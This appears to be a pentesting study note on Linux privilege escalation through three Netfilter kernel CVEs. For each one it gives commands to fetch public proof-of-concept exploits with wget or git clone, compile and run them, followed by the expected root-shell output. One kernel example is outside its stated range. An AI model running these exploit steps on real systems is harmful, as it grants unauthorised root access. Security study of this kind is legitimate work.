---
title: Netfilter vulnerabilities
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Netfilter vulnerabilities

## What is Netfilter?
Netfilter is a Linux kernel module that provides:
- Packet filtering
- Network address translation (NAT)
- Connection tracking
- Other firewall-related tools

It controls network traffic by manipulating individual packets based on rules. Programs like `iptables` and `arptables` serve as action mechanisms of Netfilter in the IPv4 and IPv6 protocol stack.

### Main Functions:
1. Packet defragmentation
2. Connection tracking
3. Network address translation (NAT)

## Exploiting Netfilter Vulnerabilities

### CVE-2021-22555
**Vulnerable Kernel Versions:** 2.6 - 5.11

#### Check Kernel Version

```sh
uname -r
```

**Example Output:**

```sh
5.10.5-051005-generic
```

#### Exploit Execution

```sh
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

**Expected Output:**

```sh
[+] Linux Privilege Escalation by theflow@ - 2021
[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...
...
root@ubuntu:/home/cry0l1t3# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### CVE-2022-25636

**Vulnerable Kernel Versions:** 5.4 - 5.6.10

⚠ **Warning:** This exploit may corrupt the kernel and require a reboot.

#### Check Kernel Version

```sh
uname -r
```

**Example Output:**

```sh
5.13.0-051300-generic
```

#### Exploit Execution

```sh
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```


**Expected Output:**

```sh
[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000
...
[*] You've Got ROOT:-)
# id
uid=0(root) gid=0(root) groups=0(root)
```



---

### CVE-2023-32233

**Vulnerable Kernel Versions:** Up to 6.3.1

#### Exploit Execution

```sh
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

**Expected Output:**

```sh
[*] Netfilter UAF exploit
[*] Checking for available CPUs...
...
[*] You've Got ROOT:-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

⚠ **Note:** Exploiting this vulnerability allows interaction with the kernel's memory, potentially leading to root privileges.

## Final Notes
- These exploits can be highly **unstable** and may break your system.
- Always test in a **controlled environment**.
- Keeping your Linux system **updated** is crucial to mitigate such vulnerabilities.
